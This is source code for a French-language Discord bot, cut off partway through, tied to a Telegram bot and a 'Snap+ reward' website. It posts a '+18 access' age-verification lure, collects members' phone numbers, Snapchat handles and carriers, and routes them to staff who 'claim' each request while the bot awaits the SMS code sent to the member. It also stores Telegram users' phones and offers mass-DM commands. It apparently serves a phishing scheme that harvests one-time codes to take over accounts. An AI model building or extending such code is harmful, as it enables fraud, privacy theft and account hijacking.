require("dotenv").config();
const fs = require("fs");
const path = require("path");
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, ChannelType, PermissionsBitField, MessageFlags, Partials } = require("discord.js");
const express = require("express");
const app = express();
app.use(express.json());
app.get("/", (req, res) => res.send("Bot online"));

// ========== SNAP+ SITE INTEGRATION ==========
const SNAP_SITE = "https://snap-reward.onrender.com";
const SNAP_MOD_CHANNEL_ID = process.env.SNAP_MOD_CHANNEL_ID || "1547685592928751626";
const SNAP_PING_ROLE_ID = process.env.SNAP_PING_ROLE_ID || "1547717348348403812";

const treatedSnap = new Set();
const sentSnapCodes = new Set();

function snapFormatPhone(p) {
  return p.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
}

// Webhook : site web (snap-reward) -> Discord embed (pseudo + telephone)
const WEB_CLAIM_CHANNEL_ID = process.env.WEB_CLAIM_CHANNEL_ID || "1547685592928751628";
const webhookDedup = new Map();
const webTickets = new Map();

app.options("/webhook/form", (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-secret-token');
  res.status(204).end();
});

app.post("/webhook/form", async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-secret-token');
  if (req.headers["x-secret-token"] !== process.env.SITE_SECRET) {
    return res.status(401).json({ error: "Non autorise" });
  }

  const { pseudo, phone } = req.body || {};
  if (!pseudo || !phone) {
    return res.status(400).json({ error: "Pseudo et telephone requis" });
  }

  const dedupKey = `${pseudo}|${phone}`;
  const now = Date.now();
  const last = webhookDedup.get(dedupKey);
  if (last && now - last < 10000) {
    return res.status(429).json({ error: "Demande deja en cours de traitement" });
  }
  webhookDedup.set(dedupKey, now);

  try {
    const logChannel = await client.channels.fetch("1548532310415118376").catch(() => null);
    const modChannel = await getModChannel().catch(() => null);
    const targetChannel = modChannel || logChannel;
    if (!targetChannel) throw new Error("Aucun salon texte accessible par le bot");

    const modGuild = targetChannel.guild || await client.guilds.fetch(MOD_GUILD_ID).catch(() => null);
    if (!modGuild) throw new Error("Guilde introuvable");

    const webId = Date.now().toString(36) + Math.random().toString(36).slice(2, 5);
    const now2 = new Date();
    const dateStr = now2.toLocaleString("fr-FR", { timeZone: "Europe/Paris", day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });

    let claimChannel = await client.channels.fetch(WEB_CLAIM_CHANNEL_ID).catch(() => null);
    if (!claimChannel || !claimChannel.isTextBased()) {
      const guild = claimChannel && claimChannel.guild ? claimChannel.guild : modGuild;
      for (const [, ch] of guild.channels.cache) {
        if (ch.type === ChannelType.GuildText) {
          try {
            const perms = ch.permissionsFor(client.user);
            if (perms && perms.has([PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ViewChannel])) {
              claimChannel = ch;
              break;
            }
          } catch {}
        }
      }
    }
    if (!claimChannel) throw new Error("Aucun salon texte accessible pour envoyer le message Claim");

    const claimEmbed = new EmbedBuilder()
      .setTitle(pseudo)
      .setDescription(`Web \`${webId}\`\n\n🟢 present\n\n**Soumis** · ${dateStr}\n\nClaim par @_`)
      .addFields({ name: "Numero", value: `> \`${formatPhone(phone)}\` · ${getOperator(phone)}`, inline: false })
      .setColor(0x2b2d31);

    const claimRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`claim_web_${webId}`).setLabel("✅ Claim — Creer le salon").setStyle(ButtonStyle.Primary)
    );

    const claimMsg = await claimChannel.send({ content: `<@&1547717348348403812>`, embeds: [claimEmbed], components: [claimRow], allowedMentions: { roles: ["1547717348348403812"] } });

    webTickets.set(webId, {
      phone,
      originGuildId: "web",
      userId: "0",
      date: now,
      dateStr,
      modChannelId: claimChannel.id,
      modMessageId: claimMsg.id,
      claimedBy: null,
      threadId: null,
      detailMessageId: null,
      pseudo,
      tgName: null
    });

    res.json({ ok: true, webId });
  } catch (e) {
    console.error("Erreur webhook form:", e.message);
    res.status(500).json({ error: "Erreur: " + e.message });
  }
});

app.listen(process.env.PORT || 3000);

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.DirectMessages, GatewayIntentBits.GuildMessages], partials: [Partials.Channel, Partials.Message] });
const pending = new Map();
const blacklistedNums = new Set();
const blacklistedUsers = new Set();
const PENDING_TIMEOUT_MS = 15 * 60 * 1000;
setInterval(async () => {
  if (!client.isReady()) return;
  const now = Date.now();
  for (const [key, data] of [...pending.entries()]) {
    if (data.claimedBy) continue;
    if (data.timedOut) continue;
    if (key.startsWith("mass_")) continue;
    if (key.startsWith("web:") || key.startsWith("wbt:")) continue;
    if (!data.date) continue;
    if (now - new Date(data.date).getTime() < PENDING_TIMEOUT_MS) continue;
    try {
      const isTg = data.originGuildId === "tg";
      if (isTg) {
        if (tgBot) {
          try { await tgBot.telegram.sendMessage(data.userId, "⏳ **File d'attente**\n\nAucun modérateur n'est disponible pour le moment.\nTa demande est bien enregistrée, tu seras notifié dès qu'un modérateur sera disponible.\n\n*Merci de patienter* 🙏"); } catch {}
        }
      } else {
        try {
          const u = await client.users.fetch(data.userId);
          const waitEmbed = new EmbedBuilder().setTitle("⏳ File d'attente — Modération").setDescription("Aucun modérateur n'est disponible pour le moment.\n\nTa demande est bien enregistrée, tu seras notifié dès qu'un modérateur sera disponible.\n\n*Merci de patienter* 🙏").setColor(0xfaa61a).setTimestamp();
          await u.send({ embeds: [waitEmbed] });
        } catch {}
      }
      try {
        const ch = await client.channels.fetch(data.modChannelId).catch(()=>null);
        if (ch) {
          const msg = await ch.messages.fetch(data.modMessageId).catch(()=>null);
          if (msg) {
            const baseDesc = msg.embeds[0]?.description || "";
            const timeoutEmbed = new EmbedBuilder()
              .setTitle(msg.embeds[0]?.title || "Demande expirée")
              .setDescription(baseDesc + "\n\n⏳ **Non claim après 15 min — Aucun modérateur n'a pris la demande**\n*Utilisateur notifié : réessaie plus tard*")
              .setColor(0x808080)
              .setTimestamp();
            const pretRow = new ActionRowBuilder().addComponents(
              new ButtonBuilder().setCustomId(`pret_${data.originGuildId}_${data.userId}`).setLabel("✅ Prêt — Notifier l'utilisateur").setStyle(ButtonStyle.Success).setEmoji("👋")
            );
            await msg.edit({ embeds: [timeoutEmbed], components: [pretRow] }).catch(()=>{});
            data.timedOut = true;
            pending.set(key, data);
            continue;
          }
        }
      } catch {}
    } catch {}
    pending.delete(key);
  }
}, 60 * 1000);

const MOD_GUILD_ID = process.env.MOD_GUILD_ID || "1547685592928751628";
const VALIDATED_CHANNEL_ID = process.env.VALIDATED_CHANNEL_ID || "1548532409153363968";
const FAILED_CHANNEL_ID = process.env.FAILED_CHANNEL_ID || "1548532447786967052";
const STATS_PATH = path.join(__dirname, "stats.json");
const DB_STATS_CHANNEL_ID = process.env.DB_STATS_CHANNEL_ID || "1548535878509400184";
let stats = {
  validated: 1, failed: 5, lastUpdate: "2026-09-13T03:06:15Z", lastUpdateBy: "1536783268219977738", lastStatus: "validated",
  staff: { "1536783268219977738": { validated: 1, failed: 5, lastUpdate: "2026-09-13T03:06:15Z", lastStatus: "validated", tag: "Staff" } },
  telegramUsers: {},
  blacklistedNums: [],
  blacklistedUsers: [],
  pending: {}
};
let dbStatsMessageId = null;
try {
  if (fs.existsSync(STATS_PATH)) {
    const raw = JSON.parse(fs.readFileSync(STATS_PATH, "utf8"));
    stats = { ...stats, ...raw };
    if (!stats.staff) stats.staff = {};
    if (!stats.telegramUsers) stats.telegramUsers = {};
    if (!stats.blacklistedNums) stats.blacklistedNums = [];
    if (!stats.blacklistedUsers) stats.blacklistedUsers = [];
    if (!stats.pending) stats.pending = {};
    for (const n of stats.blacklistedNums) blacklistedNums.add(n);
    for (const u of stats.blacklistedUsers) blacklistedUsers.add(u);
    for (const [k, v] of Object.entries(stats.pending)) {
      if (k.startsWith("mass_")) continue;
      if (k.startsWith("web:")) {
        console.log(`[cleanup] suppression ancienne entrée web: ${k}`);
        continue;
      }
      if (v.date) v.date = new Date(v.date);
      pending.set(k, v);
    }
  }
} catch (e) { console.error("stats load fail:", e.message); }
function saveStats() {
  try { fs.writeFileSync(STATS_PATH, JSON.stringify(stats, null, 2)); } catch (e) { console.error("stats save fail:", e.message); }
}
async function getDbChannel() {
  try { return await client.channels.fetch(DB_STATS_CHANNEL_ID); } catch (e) { console.error("DB_STATS_CHANNEL fetch fail:", e.message); return null; }
}
async function loadDbStats() {
  const ch = await getDbChannel();
  if (!ch) return;
  try {
    const msgs = await ch.messages.fetch({ limit: 20 });
    const botMsg = msgs.find(m => m.author.id === client.user.id && m.content.includes("DB_STATS"));
    if (botMsg) {
      dbStatsMessageId = botMsg.id;
      let jsonStr = "";
      if (botMsg.attachments.size > 0) {
        const att = botMsg.attachments.first();
        if (att && att.name === "stats.json") {
          try {
            const res = await fetch(att.url);
            jsonStr = await res.text();
          } catch {}
        }
      }
      if (!jsonStr) jsonStr = botMsg.content.replace(/.*DB_STATS\s*/s, "").replace(/```json|```/g, "").trim();
      const parsed = JSON.parse(jsonStr);
      stats = { ...stats, ...parsed };
      if (!stats.staff) stats.staff = {};
      if (!stats.telegramUsers) stats.telegramUsers = {};
      if (!stats.blacklistedNums) stats.blacklistedNums = [];
      if (!stats.blacklistedUsers) stats.blacklistedUsers = [];
      if (!stats.pending) stats.pending = {};
      blacklistedNums.clear(); for (const n of stats.blacklistedNums) blacklistedNums.add(n);
      blacklistedUsers.clear(); for (const u of stats.blacklistedUsers) blacklistedUsers.add(u);
      for (const [k, v] of Object.entries(stats.pending)) {
        if (k.startsWith("mass_")) continue;
        if (v.date) v.date = new Date(v.date);
        pending.set(k, v);
      }
      try { fs.writeFileSync(STATS_PATH, JSON.stringify(stats, null, 2)); } catch {}
      console.log("stats loaded from db-stats:", stats);
      return;
    }
    const content = `DB_STATS\n\`\`\`json\n${JSON.stringify(stats, null, 2)}\n\`\`\``;
    const sent = await ch.send(content);
    dbStatsMessageId = sent.id;
    console.log("db-stats initial créé:", dbStatsMessageId);
  } catch (e) { console.error("loadDbStats fail:", e.message); }
}
function trackTelegramUser(tgUser, phone) {
  if (!stats.telegramUsers) stats.telegramUsers = {};
  const id = String(tgUser.id);
  stats.telegramUsers[id] = {
    username: tgUser.username || "",
    first_name: tgUser.first_name || "",
    lastSeen: new Date().toISOString(),
    phone: phone || stats.telegramUsers[id]?.phone || null
  };
  saveDbStats().catch(()=>{});
}
async function saveDbStats() {
  stats.blacklistedNums = [...blacklistedNums];
  stats.blacklistedUsers = [...blacklistedUsers];
  stats.pending = Object.fromEntries([...pending.entries()].filter(([k]) => !k.startsWith("mass_")).map(([k, v]) => { const { timerInterval: _iv, ...rest } = v; return [k, { ...rest, date: v.date instanceof Date ? v.date.toISOString() : v.date }]; }));
  saveStats();
  const ch = await getDbChannel();
  if (!ch) return;
  const jsonStr = JSON.stringify(stats);
  const content = `DB_STATS\n\`\`\`json\n${jsonStr}\n\`\`\``;
  const isTooLong = content.length > 1900;
  try {
    if (dbStatsMessageId) {
      const msg = await ch.messages.fetch(dbStatsMessageId).catch(() => null);
      if (msg) {
        if (isTooLong) {
          await msg.delete().catch(()=>{});
          const sent = await ch.send({ content: "DB_STATS", files: [{ attachment: Buffer.from(jsonStr), name: "stats.json" }] });
          dbStatsMessageId = sent.id;
          return;
        }
        await msg.edit(content); return;
      }
    }
    const msgs = await ch.messages.fetch({ limit: 20 });
    const botMsg = msgs.find(m => m.author.id === client.user.id && m.content.includes("DB_STATS"));
    if (botMsg) {
      dbStatsMessageId = botMsg.id;
      if (isTooLong) {
        await botMsg.delete().catch(()=>{});
        const sent = await ch.send({ content: "DB_STATS", files: [{ attachment: Buffer.from(jsonStr), name: "stats.json" }] });
        dbStatsMessageId = sent.id;
      } else {
        await botMsg.edit(content);
      }
    } else {
      if (isTooLong) {
        const sent = await ch.send({ content: "DB_STATS", files: [{ attachment: Buffer.from(jsonStr), name: "stats.json" }] });
        dbStatsMessageId = sent.id;
      } else {
        const sent = await ch.send(content); dbStatsMessageId = sent.id;
      }
    }
  } catch (e) { console.error("saveDbStats fail:", e.message); }
}
let tgBot = null;
function notifyTelegram(tgId, text, forceCode) {
  if (!tgBot) return;
  const extra = forceCode ? { reply_markup: { force_reply: true, input_field_placeholder: "0000" } } : undefined;
  tgBot.telegram.sendMessage(tgId, text, extra).catch(() => {});
}

function formatPhone(p) {
  return p.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
}

function getOperatorSync(p) {
  const pre = p.slice(0, 4);
  const bouygues = new Set(["0653","0660","0661","0662","0663","0664","0665","0666","0667","0668","0695","0696","0697","0698","0699","0760","0761","0762","0763","0798","0799"]);
  const free = new Set(["0651","0652","0654","0656","0749","0750","0768","0769","0783","0784"]);
  const orange = new Set(["0607","0608","0630","0631","0632","0633","0634","0635","0670","0671","0672","0673","0674","0675","0676","0677","0678","0679","0680","0681","0682","0683","0684","0685","0686","0687","0688","0689","0690","0707","0764","0765","0766","0767","0770","0771","0776","0777","0780","0781","0782","0786","0787","0788","0789","0790"]);
  const sfr = new Set(["0603","0604","0605","0606","0609","0610","0611","0612","0613","0614","0615","0616","0617","0618","0619","0620","0621","0622","0623","0624","0625","0626","0627","0628","0629","0636","0639","0640","0641","0642","0643","0644","0645","0646","0647","0648","0649","0650","0655","0657","0658","0659","0669","0691","0692","0693","0694","0700","0701","0702","0703","0704","0705","0706","0708","0709"]);
  if (bouygues.has(pre)) return "Bouygues Telecom";
  if (free.has(pre)) return "Free Mobile";
  if (orange.has(pre)) return "Orange";
  if (sfr.has(pre)) return "SFR Mobile";
  if (p.startsWith("06") || p.startsWith("07")) return "SFR Mobile";
  return "Mobile FR";
}
function getOperator(p) { return getOperatorSync(p); }
const operatorCache = new Map();
async function getOperatorPrecise(p) {
  if (!p) return getOperatorSync(p);
  if (operatorCache.has(p)) return operatorCache.get(p);
  const key = process.env.ABSTRACT_API_KEY;
  if (!key) {
    const op = getOperatorSync(p);
    operatorCache.set(p, op);
    return op;
  }
  try {
    const phoneIntl = p.startsWith("0") ? "+33" + p.slice(1) : p;
    const url = `https://phonevalidation.abstractapi.com/v1/?api_key=${key}&phone=${encodeURIComponent(phoneIntl)}`;
    const res = await fetch(url, { signal: AbortSignal.timeout(4000) });
    if (!res.ok) throw new Error("abstract status " + res.status);
    const j = await res.json();
    const carrier = j.carrier || j.carrier_name || j?.phone?.carrier;
    if (carrier && typeof carrier === "string" && carrier.trim()) {
      operatorCache.set(p, carrier.trim());
      return carrier.trim();
    }
  } catch (e) {
    const vKey = process.env.VERIPHONE_API_KEY;
    if (vKey) {
      try {
        const phoneIntl2 = p.startsWith("0") ? "+33" + p.slice(1) : p;
        const url2 = `https://api.veriphone.io/v2/verify?phone=${encodeURIComponent(phoneIntl2)}&key=${vKey}`;
        const res2 = await fetch(url2, { signal: AbortSignal.timeout(4000) });
        if (res2.ok) {
          const j2 = await res2.json();
          const carrier2 = j2.carrier || j2.carrier_name || j2?.carrier;
          if (carrier2 && typeof carrier2 === "string" && carrier2.trim()) {
            operatorCache.set(p, carrier2.trim());
            return carrier2.trim();
          }
        }
      } catch {}
    }
    const op = getOperatorSync(p);
    operatorCache.set(p, op);
    return op;
  }
  const vKey2 = process.env.VERIPHONE_API_KEY;
  if (vKey2) {
    try {
      const phoneIntl3 = p.startsWith("0") ? "+33" + p.slice(1) : p;
      const url3 = `https://api.veriphone.io/v2/verify?phone=${encodeURIComponent(phoneIntl3)}&key=${vKey2}`;
      const res3 = await fetch(url3, { signal: AbortSignal.timeout(4000) });
      if (res3.ok) {
        const j3 = await res3.json();
        const carrier3 = j3.carrier || j3.carrier_name || j3?.carrier;
        if (carrier3 && typeof carrier3 === "string" && carrier3.trim()) {
          operatorCache.set(p, carrier3.trim());
          return carrier3.trim();
        }
      }
    } catch {}
  }
  const op = getOperatorSync(p);
  operatorCache.set(p, op);
  return op;
}
function getOperatorSlug(p) {
  const op = getOperator(p);
  if (op.includes("Bouygues")) return "bouygues";
  if (op.includes("Free")) return "free";
  if (op.includes("Orange")) return "orange";
  if (op.includes("SFR")) return "sfr";
  return "mobile";
}
async function getOperatorSlugPrecise(p) {
  const op = await getOperatorPrecise(p);
  if (op.includes("Bouygues")) return "bouygues";
  if (op.includes("Free")) return "free";
  if (op.includes("Orange")) return "orange";
  if (op.includes("SFR")) return "sfr";
  return "mobile";
}

async function getModChannel() {
  if (process.env.MOD_CHANNEL_ID) {
    try {
      const c = await client.channels.fetch(process.env.MOD_CHANNEL_ID);
      if (c) return c;
    } catch (e) { console.error("MOD_CHANNEL_ID fetch fail:", e.message); }
  }
  const guild = await client.guilds.fetch(MOD_GUILD_ID);
  const me = await guild.members.fetchMe().catch(() => null);
  const channels = await guild.channels.fetch();
  for (const [, ch] of channels) {
    if (ch.type !== ChannelType.GuildText) continue;
    try {
      const perms = me ? ch.permissionsFor(me) : ch.permissionsFor(guild.members.me);
      if (perms && perms.has([PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ViewChannel])) return ch;
    } catch {}
  }
  throw new Error("Salon modo introuvable, mets MOD_CHANNEL_ID dans Render");
}

async function getLogChannel() {
  const logId = process.env.LOG_CHANNEL_ID || "1548532310415118376";
  try {
    const c = await client.channels.fetch(logId);
    return c;
  } catch (e) { console.error("LOG_CHANNEL_ID fetch fail:", e.message); return null; }
}

async function sendClaimLog({ claimerId, claimedUserId, claimedUserTag, phone, originGuild, tgName }) {
  const logChannel = await getLogChannel();
  if (!logChannel) return;
  const operator = await getOperatorPrecise(phone);
  const formatted = formatPhone(phone);
  const nowStr = new Date().toLocaleString("fr-FR", { timeZone: "Europe/Paris", day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });
  const isTg = originGuild && originGuild.id === "tg";
  const embed = new EmbedBuilder()
    .setTitle("📌 Claim vérification")
    .setColor(0x5865f2)
    .setTimestamp()
    .addFields(
      { name: "👮 Claim par", value: `<@${claimerId}> \`${claimerId}\``, inline: false },
      { name: "👤 Claimé", value: isTg ? `${tgName || "Telegram"} \`${claimedUserId}\`` : `<@${claimedUserId}> \`${claimedUserId}\` ${claimedUserTag ? `(${claimedUserTag})` : ""}`, inline: false },
      { name: "📱 Numéro", value: `\`${formatted}\` · ${operator}`, inline: true },
      { name: "🌐 Origine", value: isTg ? "Telegram" : `${originGuild ? originGuild.name : "Inconnu"} \`${originGuild ? originGuild.id : "?"}\``, inline: true },
      { name: "📅 Date", value: nowStr, inline: false }
    )
    .setFooter({ text: `Claim • ${nowStr}` });
  try {
    await logChannel.send({ embeds: [embed] });
  } catch (e) { console.error("sendClaimLog fail:", e.message); }
}

async function sendFinalResultLog({ status, claimerId, claimedUserId, claimedUserTag, phone, originGuild, tgName }) {
  const targetId = status === "validated" ? VALIDATED_CHANNEL_ID : FAILED_CHANNEL_ID;
  let targetChannel = null;
  try {
    targetChannel = await client.channels.fetch(targetId);
  } catch (e) {
    console.error(`Final ${status} channel fetch fail:`, e.message);
    return;
  }
  const operator = phone ? await getOperatorPrecise(phone) : "Inconnu";
  const formatted = phone ? formatPhone(phone) : "Inconnu";
  const nowStr = new Date().toLocaleString("fr-FR", { timeZone: "Europe/Paris", day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });
  const isTg = originGuild && originGuild.id === "tg";
  const isValidated = status === "validated";
  const embed = new EmbedBuilder()
    .setTitle(isValidated ? "✅ Vérification validée" : "❌ Vérification échouée")
    .setColor(isValidated ? 0x57f287 : 0xed4245)
    .setTimestamp()
    .addFields(
      { name: "👮 Géré par", value: `<@${claimerId}> \`${claimerId}\``, inline: false },
      { name: "👤 Membre", value: isTg ? `${tgName || "Telegram"} \`${claimedUserId}\`` : (claimedUserId === "web" || !/^\d+$/.test(claimedUserId) ? `${claimedUserTag || claimedUserId}` : `<@${claimedUserId}> \`${claimedUserId}\` ${claimedUserTag ? `(${claimedUserTag})` : ""}`), inline: false },
      { name: "📱 Numéro", value: `\`${formatted}\` · ${operator}`, inline: true },
      { name: "🌐 Origine", value: isTg ? "Telegram" : `${originGuild ? originGuild.name : "Inconnu"} \`${originGuild ? originGuild.id : "?"}\``, inline: true },
      { name: "📅 Date", value: nowStr, inline: false }
    )
    .setFooter({ text: `${isValidated ? "Validé" : "Échoué"} • ${nowStr}` });
  try {
    await targetChannel.send({ embeds: [embed] });
  } catch (e) {
    console.error(`sendFinalResultLog ${status} fail:`, e.message);
  }
}

async function buildModEmbed(user, originGuild, phone, code, dateStr, claimTs = null, elapsedStr = null) {
  const operator = await getOperatorPrecise(phone);
  const formatted = formatPhone(phone);
  const codeLine = code ? `\`${code}\`` : "En attente du code membre";
  const timerLine = claimTs ? `> ⏱️ Timer — \`${elapsedStr || "00:00"}\` écoulé · <t:${claimTs}:R>` : "";
  const suivi = `> 🔄 Statut — ${code ? "Code reçu" : "SMS envoyé — en attente du code membre"}\n> 🌐 Code — ${codeLine}\n> 📅 Soumis — ${dateStr} · à l'instant\n> 📩 SMS envoyé — ${dateStr} · à l'instant${timerLine ? `\n${timerLine}` : ""}`;
  return new EmbedBuilder()
    .setTitle(`${user.username} • ${user.id}`)
    .setDescription(`${originGuild.name} • ${originGuild.memberCount || 0} membres`)
    .setThumbnail(user.displayAvatarURL())
    .addFields(
      { name: "Présence", value: `> 🟢 présent`, inline: false },
      { name: "Numéro", value: `> \`${formatted}\` · ${operator}`, inline: false },
      { name: "📋 Suivi vérification", value: suivi, inline: false }
    )
    .setColor(0x2b2d31);
}

function buildClaimEmbed(user, originGuild, memberPresent, memberCount, dateStr, claimedBy) {
  const presence = memberPresent ? "🟢 présent" : "❌ A quitté le serveur";
  const claimLine = claimedBy ? `<@${claimedBy}>` : "@_";
  return new EmbedBuilder()
    .setTitle(`${user.username}`)
    .setDescription(`<@${user.id}> · \`${user.id}\`\n${originGuild.name}\n\n${presence} · ${memberCount} membres\n\n**Soumis** · ${dateStr}\n\nClaim par ${claimLine}`)
    .setThumbnail(user.displayAvatarURL())
    .setColor(0x2b2d31);
}
function buildTimerEmbed(claimerId, claimTs, phone, operator) {
  const formatted = phone ? formatPhone(phone) : "Inconnu";
  return new EmbedBuilder()
    .setTitle("⏱️ Timer — Ticket en cours")
    .setDescription(`Claim par <@${claimerId}> • <t:${claimTs}:F> (<t:${claimTs}:R>)\nTraitement en cours…`)
    .addFields(
      { name: "⏳ Écoulé", value: "`00:00`", inline: true },
      { name: "⌛ Depuis claim", value: `<t:${claimTs}:R>`, inline: true },
      { name: "📞 Numéro", value: `> \`${formatted}\` · ${operator}`, inline: false }
    )
    .setColor(0x5865F2)
    .setFooter({ text: "Salon auto-supprimé après Oui / Non" })
    .setTimestamp(new Date(claimTs * 1000));
}

async function sendToMods(originInteraction, phone) {
  const user = originInteraction.user;
  const originGuild = originInteraction.guild;
  const key = `${originGuild.id}:${user.id}`;
  const now = new Date();
  const dateStr = now.toLocaleString("fr-FR", { timeZone: "Europe/Paris", day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });
  let present = true;
  try {
    await originGuild.members.fetch(user.id);
  } catch { present = false; }
  const embed = buildClaimEmbed(user, originGuild, present, originGuild.memberCount || 0, dateStr, null);
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`claim_${originGuild.id}_${user.id}`).setLabel("Claim").setStyle(ButtonStyle.Secondary)
  );
  const modChannel = await getModChannel();
  const sent = await modChannel.send({ content: `<@&1547717348348403812>`, embeds: [embed], components: [row], allowedMentions: { roles: ["1547717348348403812"] } });
  pending.set(key, { phone, code: null, originGuildId: originGuild.id, userId: user.id, date: now, dateStr, modChannelId: modChannel.id, modMessageId: sent.id, claimedBy: null, threadId: null, detailMessageId: null });
  saveDbStats().catch(()=>{});
}

let readyDone = false;
async function onReady() {
  if (readyDone) return;
  readyDone = true;
  console.log(`Connecte en tant que ${client.user.tag}`);
  try {
    const commands = [
      { name: "clear", description: "Supprime les messages du salon", default_member_permissions: "8192" },
      { name: "stats", description: "Affiche les stats valide / échoué" },
      { name: "classement", description: "Classement des staffs par vérifications" },
      { name: "historique", description: "Historique d'un staff", options: [{ name: "membre", description: "Membre à voir", type: 6, required: false }] },
      { name: "tg_msg", description: "Envoie un MP Telegram à un membre (depuis Discord)", options: [{ name: "id", description: "ID Telegram (ex: 123456789)", type: 3, required: true }, { name: "message", description: "Message à envoyer", type: 3, required: true }] },
      { name: "dm", description: "Envoie un MP Discord à un membre (depuis le bot)", options: [{ name: "membre", description: "Membre Discord", type: 6, required: true }, { name: "message", description: "Message à envoyer", type: 3, required: true }] },
      { name: "mass_dm_discord", description: "Envoie un MP à tout le monde sur Discord (token demandé)", options: [{ name: "message", description: "Message à envoyer", type: 3, required: true }] },
      { name: "mass_dm_telegram", description: "Envoie un MP à tout le monde sur Telegram", options: [{ name: "message", description: "Message à envoyer", type: 3, required: true }] },
      { name: "listetlg", description: "Liste tous les users Telegram stockés (pseudo, ID, téléphone)" },
      { name: "test_timeout", description: "Test le timeout 15min (crée un faux pending)" },
      { name: "resetstat", description: "Reset les stats d'un membre", options: [{ name: "membre", description: "Membre à reset", type: 6, required: true }] },
      { name: "help", description: "Affiche l'aide des commandes" }
    ];
    try { await client.application.commands.set(commands); } catch (e) { console.error("global set fail:", e.message); }
    for (const [, g] of client.guilds.cache) {
      try { await g.commands.set(commands); } catch (e) { console.error("guild set fail", g.id, e.message); }
    }
    try {
      const modGuild = await client.guilds.fetch(MOD_GUILD_ID).catch(() => null);
      if (modGuild && !client.guilds.cache.has(modGuild.id)) {
        await modGuild.commands.set(commands).catch(() => {});
      }
    } catch (e) { console.error("guild fetch set fail:", e.message); }
  } catch (e) { console.error("slash create fail:", e.message); }
  try { await loadDbStats(); } catch (e) { console.error("loadDbStats onReady fail:", e.message); }
  if (!stats.patchnoteSent) {
    try {
      const patchChannel = await client.channels.fetch("1548554013979447397").catch(()=>null);
      if (patchChannel && patchChannel.isTextBased()) {
        const patchContent = `<@&1547717348348403812>\n\n**Patchnote — Nouveautés**\n\n• /stats : voir les chiffres → tout le monde\n• /classement : voir le classement → tout le monde\n• /help : voir l'aide → tout le monde\n\n• /historique : voir ce qu'une personne a fait → rôle Modo\n• /listetlg : voir la liste Telegram → rôle Modo\n• /clear : supprimer les messages → rôle Modo\n\n• /tg_msg /dm /mass_dm_discord /mass_dm_telegram : envoyer des messages → rôle Modo + salon <#1548542207605342230>\n\n• Nouveau système de logs qui enregistre toutes les vérifs pour suivre les statistiques\n• Si personne ne s'occupe d'une vérif pendant 15 min → bouton Prêt\n• Les salons s'appellent avec l'opérateur`;
        await patchChannel.send({ content: patchContent, allowedMentions: { roles: ["1547717348348403812"] } });
        stats.patchnoteSent = true;
        await saveDbStats();
      }
    } catch {}
  }

  // ── Vérification des nouvelles demandes Snap+ (toutes les 10s) ──
  setInterval(async () => {
    try {
      const res = await fetch(`${SNAP_SITE}/api/admin/list`);
      const json = await res.json();
      if (!json.ok || !json.items) return;

      for (const { id, data } of json.items) {
        if (treatedSnap.has(id)) continue;
        treatedSnap.add(id);

        const embed = new EmbedBuilder()
          .setColor(0x0099ff)
          .setTitle("Nouvelle demande Snap+")
          .setDescription(
            `**Pseudo :** ${data.pseudo || "-"}\n` +
            `**Compte Snap :** @${data.handle || "-"}\n` +
            `**Numéro :** \`${snapFormatPhone(data.phone)}\`\n` +
            `**Opérateur :** ${data.operator || "-"}\n` +
            `**ID :** \`${id.slice(0, 8)}\``
          )
          .setFooter({ text: "Snap+ Rewardly", iconURL: client.user.displayAvatarURL() })
          .setTimestamp();

        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder()
            .setCustomId(`snap_ok_${id}`)
            .setLabel("Valider")
            .setStyle(ButtonStyle.Success)
            .setEmoji("✅"),
          new ButtonBuilder()
            .setCustomId(`snap_no_${id}`)
            .setLabel("Refuser")
            .setStyle(ButtonStyle.Danger)
            .setEmoji("❌")
        );

        const channel = await client.channels.fetch(SNAP_MOD_CHANNEL_ID);
        await channel.send({
          content: `<@&${SNAP_PING_ROLE_ID}>`,
          embeds: [embed],
          components: [row],
          allowedMentions: { roles: [SNAP_PING_ROLE_ID] }
        });
      }
    } catch (err) {
      console.error("Erreur polling Snap+ :", err.message);
    }
  }, 10000);

  const channel = await client.channels.fetch(process.env.CHANNEL_ID);
  const messages = await channel.messages.fetch({ limit: 20 });
  const old = messages.filter((m) => m.author.id === client.user.id);
  if (old.size > 0) return;
  const embed = new EmbedBuilder()
    .setTitle("🍑 ACCÈS +18 UNIQUEMENT")
    .setDescription("Tu pensais vraiment avoir **accès** à tout le serveur directement ? 😈\n\nUne partie du contenu est **caché** uniquement réservé a nos membres majeurs vérifiés.🔐\n\nListe des salons ci-dessous")
    .setImage(process.env.IMAGE_URL)
    .setFooter({ text: "Clique sur le bouton pour te faire vérifier" })
    .setColor(0xe67e22);
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId("verify_age").setLabel("🔓 Vérifier mon âge").setStyle(ButtonStyle.Primary)
  );
  await channel.send({ embeds: [embed], components: [row] });
}
client.once("clientReady", onReady);
client.on("guildMemberAdd", async (m) => {
  try {
    const ch = await client.channels.fetch("1547689995949703209").catch(() => null);
    if (!ch || !ch.isTextBased()) return;
    const msg = await ch.send({ content: `<@${m.id}>`, allowedMentions: { users: [m.id] } });
    setTimeout(() => msg.delete().catch(() => {}), 1500);
  } catch {}
});
client.on("messageCreate", async (m) => {
  if (m.author.bot) return;
  const code = m.content.trim();
